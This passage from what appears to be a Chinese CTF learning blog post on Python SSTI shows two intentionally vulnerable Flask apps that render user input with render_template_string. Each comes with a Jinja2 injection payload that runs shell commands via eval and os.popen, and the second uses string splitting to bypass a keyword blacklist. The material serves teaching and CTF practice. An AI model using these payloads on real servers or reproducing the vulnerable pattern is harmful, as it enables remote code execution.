class="number">0x00000216DF1DA660</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;first&#x27;<span class="punctuation">:</span> &lt;function do_first at <span class="number">0x00000216DF1DA520</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;float&#x27;<span class="punctuation">:</span> &lt;function do_float at <span class="number">0x00000216DF1DAB60</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;forceescape&#x27;<span class="punctuation">:</span> &lt;function do_forceescape at <span class="number">0x00000216DF1D9580</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;format&#x27;<span class="punctuation">:</span> &lt;function do_format at <span class="number">0x00000216DF1DAC00</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;groupby&#x27;<span class="punctuation">:</span> &lt;function do_groupby at <span class="number">0x00000216DF1DB880</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;indent&#x27;<span class="punctuation">:</span> &lt;function do_indent at <span class="number">0x00000216DF1DA840</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;int&#x27;<span class="punctuation">:</span> &lt;function do_int at <span class="number">0x00000216DF1DAAC0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;join&#x27;<span class="punctuation">:</span> &lt;function do_join at <span class="number">0x00000216DF1DA200</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;last&#x27;<span class="punctuation">:</span> &lt;function do_last at <span class="number">0x00000216DF1DA340</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;length&#x27;<span class="punctuation">:</span> &lt;built-in function len&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;list&#x27;<span class="punctuation">:</span> &lt;function do_list at <span class="number">0x00000216DF1DBD80</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;lower&#x27;<span class="punctuation">:</span> &lt;function do_lower at <span class="number">0x00000216DF1D9800</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;items&#x27;<span class="punctuation">:</span> &lt;function do_items at <span class="number">0x00000216DF1D98A0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;map&#x27;<span class="punctuation">:</span> &lt;function do_map at <span class="number">0x00000216DF1E0860</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;min&#x27;<span class="punctuation">:</span> &lt;function do_min at <span class="number">0x00000216DF1D9DA0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;max&#x27;<span class="punctuation">:</span> &lt;function do_max at <span class="number">0x00000216DF1D9E40</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;pprint&#x27;<span class="punctuation">:</span> &lt;function do_pprint at <span class="number">0x00000216DF1DA700</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;random&#x27;<span class="punctuation">:</span> &lt;function do_random at <span class="number">0x00000216DF1DA5C0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;reject&#x27;<span class="punctuation">:</span> &lt;function do_reject at <span class="number">0x00000216DF1E0D60</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;rejectattr&#x27;<span class="punctuation">:</span> &lt;function do_rejectattr at <span class="number">0x00000216DF1E1260</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;replace&#x27;<span class="punctuation">:</span> &lt;function do_replace at <span class="number">0x00000216DF1D96C0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;reverse&#x27;<span class="punctuation">:</span> &lt;function do_reverse at <span class="number">0x00000216DF1E00E0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;round&#x27;<span class="punctuation">:</span> &lt;function do_round at <span class="number">0x00000216DF1DB100</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;safe&#x27;<span class="punctuation">:</span> &lt;function do_mark_safe at <span class="number">0x00000216DF1DBBA0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;select&#x27;<span class="punctuation">:</span> &lt;function do_select at <span class="number">0x00000216DF1E0AE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;selectattr&#x27;<span class="punctuation">:</span> &lt;function do_selectattr at <span class="number">0x00000216DF1E0FE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;slice&#x27;<span class="punctuation">:</span> &lt;function do_slice at <span class="number">0x00000216DF1DB060</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;sort&#x27;<span class="punctuation">:</span> &lt;function do_sort at <span class="number">0x00000216DF1D9BC0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;string&#x27;<span class="punctuation">:</span> &lt;built-in function soft_str&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;striptags&#x27;<span class="punctuation">:</span> &lt;function do_striptags at <span class="number">0x00000216DF1DAD40</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;sum&#x27;<span class="punctuation">:</span> &lt;function do_sum at <span class="number">0x00000216DF1DBB00</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;title&#x27;<span class="punctuation">:</span> &lt;function do_title at <span class="number">0x00000216DF1D9A80</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;trim&#x27;<span class="punctuation">:</span> &lt;function do_trim at <span class="number">0x00000216DF1DACA0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;truncate&#x27;<span class="punctuation">:</span> &lt;function do_truncate at <span class="number">0x00000216DF1DA8E0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;unique&#x27;<span class="punctuation">:</span> &lt;function do_unique at <span class="number">0x00000216DF1D9C60</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;upper&#x27;<span class="punctuation">:</span> &lt;function do_upper at <span class="number">0x00000216DF1D9760</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;urlencode&#x27;<span class="punctuation">:</span> &lt;function do_urlencode at <span class="number">0x00000216DF1D9620</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;urlize&#x27;<span class="punctuation">:</span> &lt;function do_urlize at <span class="number">0x00000216DF1DA7A0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;wordcount&#x27;<span class="punctuation">:</span> &lt;function do_wordcount at <span class="number">0x00000216DF1DAA20</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;wordwrap&#x27;<span class="punctuation">:</span> &lt;function do_wordwrap at <span class="number">0x00000216DF1DA980</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;xmlattr&#x27;<span class="punctuation">:</span> &lt;function do_xmlattr at <span class="number">0x00000216DF1D9940</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;tojson&#x27;<span class="punctuation">:</span> &lt;function do_tojson at <span class="number">0x00000216DF1E1080</span>&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="题目：python-ssti1"><a href="#题目：python-ssti1" class="headerlink" title="题目：python ssti1"></a>题目：python ssti1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">f&#x27;&lt;h1&gt;<span class="subst">&#123;name&#125;</span> is sb&lt;/h1&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>)</span><br><span class="line">    <span class="comment">#没回显怎么办(比如最后一句换成)</span></span><br><span class="line">    <span class="comment">#render_template_string(str)</span></span><br><span class="line">    <span class="comment">#return &#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目：python-ssti2"><a href="#题目：python-ssti2" class="headerlink" title="题目：python ssti2"></a>题目：python ssti2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        blacklist = [<span class="string">&#x27;__&#x27;</span>,<span class="string">&#x27;builtin&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;app&#x27;</span>,<span class="string">&#x27;url_for&#x27;</span>,<span class="string">&#x27;get_flashed_messages&#x27;</span>,<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(i <span class="keyword">in</span> name <span class="keyword">for</span> i <span class="keyword">in</span> blacklist):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;滚丫&#x27;</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">f&#x27;&lt;h1&gt;<span class="subst">&#123;name&#125;</span> is sb&lt;/h1&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>)</span><br><span class="line">        <span class="comment">#没回显怎么办(比如最后一句换成)</span></span><br><span class="line">        <span class="comment">#render_template_string(str)</span></span><br><span class="line">        <span class="comment">#return &#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request[&quot;_&quot;+&#x27;_ini&#x27;+&#x27;t_&#x27;+&#x27;_&#x27;][&#x27;_&#x27;+&quot;_global&quot;+&quot;s_&quot;+&quot;_&quot;][&quot;_&quot;+&quot;_built&quot;+&quot;ins_&quot;+&quot;_&quot;][&quot;eval&quot;](&quot;_&quot;+&quot;_import_&quot;+&quot;_(&#x27;o&quot;+&quot;s&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其他的payload自由发挥，基本根据黑名单的不同而变化</p>
<p><strong>黑名单绕过</strong> </p>
<p>简单来说就是用等价形式代替</p>
<p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="xiaotian"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">xiaotian</p><p class="is-size-6 is-block">web安全学习者</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>err0r</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">10</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/xiaotian2023" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/xiaotian2023"><i class="fab fa-github"></i></a></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/xiaotian2023/CTF-Web-Review" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CTF复现</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/"><span class="level-start"><span class="level-item">技术</span></span><span class="level-end"><span class="level-item tag">9</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">9</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">9</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/wp/"><span class="level-start"><span class="level-item">wp</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></li></ul></li></ul></li><li><a class="level is-mobile" href="/categories/%E8%BD%AF%E4%BB%B6%E6%93%8D%E4%BD%9C/"><span class="level-start"><span class="level-item">软件操作</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/05/"><span class="level-start"><span class="level-item">五月 2025</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/04/"><span class="level-start"><span class="level-item">四月 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/03/"><span class="level-start"><span class="level-item">三月 2025</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">十月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/09/"><span class="level-start"><span class="level-item">九月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">五月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xctf/"><span class="tag">xctf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%93%8D%E4%BD%9C%E6%8C%87%E5%AF%BC/"><span class="tag">操作指导</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget" data-type="adsense"><div class="card-content"><div class="menu"><h3 class="menu-label">广告</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2272009624021828" data-ad-slot="hhh" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-05-07T13:10:12.000Z">2025-05-07</time></p><p class="title"><a href="/2025/05/07/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/">Flask内存马详解</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-05-05T08:58:47.000Z">2025-05-05</time></p><p class="title"><a href="/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/">miniLCTF2025-Web/Misc出题与WP</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-04-29T13:11:21.000Z">2025-04-29</time></p><p class="title"><a href="/2025/04/29/ACTF2025%E5%A4%8D%E7%8E%B0/">ACTF2025复现</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-03-20T13:11:21.000Z">2025-03-20</time></p><p class="title"><a href="/2025/03/20/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">java本地命令执行</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-03-11T11:49:28.000Z">2025-03-11</time></p><p class="title"><a href="/2025/03/11/python%E6%B2%99%E7%AE%B1%E4%B8%8Essti%E5%85%A5%E9%97%A8/">python沙箱与ssti入门</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="xt&#039;s blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 xiaotian</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pjax/0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>